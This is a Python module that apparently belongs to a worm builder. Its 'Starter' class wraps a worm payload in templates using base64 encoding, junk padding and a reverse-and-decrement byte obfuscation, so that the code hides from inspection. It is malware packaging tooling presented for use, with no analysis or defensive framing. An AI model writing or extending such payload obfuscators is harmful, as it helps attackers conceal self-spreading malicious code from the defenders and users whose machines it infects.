import base64
import string
from random import randint
from typing import Union
from jinja2 import Template


            

class TextGenerator:
    def __init__(self):
        self.chars = string.ascii_letters + string.digits
        self.max = len(self.chars) - 1
    
    def generate(self, count: int) -> str:
        c = 0
        text = ""
        while c < count:
            char = self.chars[randint(0, self.max)]
            text += char
            c += 1
        return text

class Starter:
    def __init__(self, coder: object):
        self.coder = coder
        self.msg = self.coder.msg
    
    def set_var(self, code: str, var: dict) -> dict:
        variables = self.coder.var
        default = {
            "_WORM_CODE" : code
        }
        var.update(default)
        return var
    
    def B64OneLine(self, starter: object, var: dict) -> str:
        raw = starter.raw_code
        code = Template(raw)
        var["_WORM_CODE"] = base64.b64encode(var["_WORM_CODE"].encode("utf-8"))
        code = code.render(var)
        return code
    
    def PyVir(self, starter: object, var: dict) -> str:
        raw = starter.raw_code
        var["_WORM_CODE"] = base64.b64encode(var["_WORM_CODE"].encode("utf-8"))
        code = Template(raw)
        code = code.render(var)
        return code

    def GarbageDump(self, starter: object, var: dict) -> str:
        var["GD_Trash1"] = var["GD_Trash1"] * 1024
        var["GD_Trash2"] = var["GD_Trash2"] * 1024
        code = Template(starter.raw_code)
        code = code.render(var)
        return code
    
    def _reverse_and_decrement(self, byte_array):
        counter = 0
        while counter < 3:
            temp_array = byte_array.copy()
            for i in range(len(byte_array)):
                temp_array[i] = byte_array[len(byte_array) - i - 1] - 3
            byte_array = temp_array
            counter += 1
        return byte_array
    
    def _obfuscate(self, code: str) -> str:
        code = bytearray(code, "utf-8")
        code = self._reverse_and_decrement(code)
        code = code.decode("utf-8")
        return code
    
    def FairyTale(self, starter: object, var: dict) -> str:
        var["_WORM_CODE"] = self._obfuscate(var["_WORM_CODE"])
        ft = Template(starter.raw_code)
        ft = ft.render(var)
        return ft

        

    def build(self, code: str, starter: object, var: dict = {}) -> str:
        self.msg("msg", f"Use Starter: '{starter.name}'")
        var = self.set_var(code, var)
        match starter.name:
            case "B64OneLine":
                return self.B64OneLine(starter, var)
            case "PyVir":
                return self.PyVir(starter, var)
            case "GarbageDump":
                return self.GarbageDump(starter, var)
            case "FairyTale":
                return self.FairyTale(starter, var)
            case _:
                self.msg("error", f"[!!] ERROR: Unknown Starter name: '{starter.name}'. Return raw code [!!]")
                return code

    def use(self, worm_pipeline: object, starter: object) -> object:
        self.msg("msg", f"Use Starter: '{starter.name}'")
        var = worm_pipeline.var.copy()
        var["_WORM_CODE"] = worm_pipeline.code
        match starter.name:
            case "B64OneLine":
                worm_pipeline.code = self.B64OneLine(starter, var)
            case "GarbageDump":
                worm_pipeline.code = self.GarbageDump(starter, var)
            case "FairyTale":
                worm_pipeline.code = self.FairyTale(starter, var)
            case "PyVir":
                worm_pipeline.code = self.PyVir(starter, var)
            case _:
                self.msg("error", f"[!!] ERROR: Unknown Starter name: '{starter.name}'. Return raw code [!!]")
        return worm_pipeline
